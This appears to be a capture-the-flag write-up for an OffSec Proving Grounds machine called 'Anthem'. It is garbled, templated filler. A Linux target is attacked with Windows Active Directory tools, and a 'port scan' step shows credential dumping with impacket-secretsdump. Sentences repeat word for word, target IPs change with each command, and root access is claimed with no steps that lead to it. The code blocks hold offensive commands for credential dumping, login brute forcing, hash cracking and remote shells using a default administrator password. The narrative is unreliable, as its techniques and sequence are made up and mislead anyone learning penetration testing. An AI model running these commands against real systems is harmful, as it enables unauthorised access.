---
TitleSEO: "OffSec Proving Grounds — Anthem (Medium Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — Anthem (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Anthem. Constrained Delegation and DCSync to achieve medium compromise on Linux."
Keywords: "active directory, pwntilldawn, reversing, forensics, ctf, easy, hard"
URL: "https://zurefx.github.io/writeups/htb-anthem-217.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-anthem-217/"
Date: "2025-01-10"
Tags: "Active Directory, PwnTillDawn, Reversing, Forensics, CTF, Easy, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-anthem-217"
Permalink: "/writeups/htb-anthem-217.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Anthem** is rated **Medium** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.78.254.27`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.97.109.2
```

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
evil-winrm -i 10.113.141.254 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.117.251.133 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
crackmapexec smb 10.104.110.38 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.105.13.60 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
evil-winrm -i 10.20.83.204 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p8080,587,53 10.57.16.226 -oN scan.txt
```

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **DCSync**.

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.42.206.12 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.117.53.113 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
evil-winrm -i 10.129.13.147 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.114.193 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.38.61/FUZZ
nmap -sCV -p23,636,8443 10.84.126.153 -oN scan.txt
crackmapexec smb 10.85.158.159 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `sqlmap`
- `kerbrute`
- `john`
- `metasploit`
- `rubeus`
- `smbexec`
- `feroxbuster`

### Key Takeaways

- Constrained Delegation
- DCSync
- XXE
- Pass the Hash
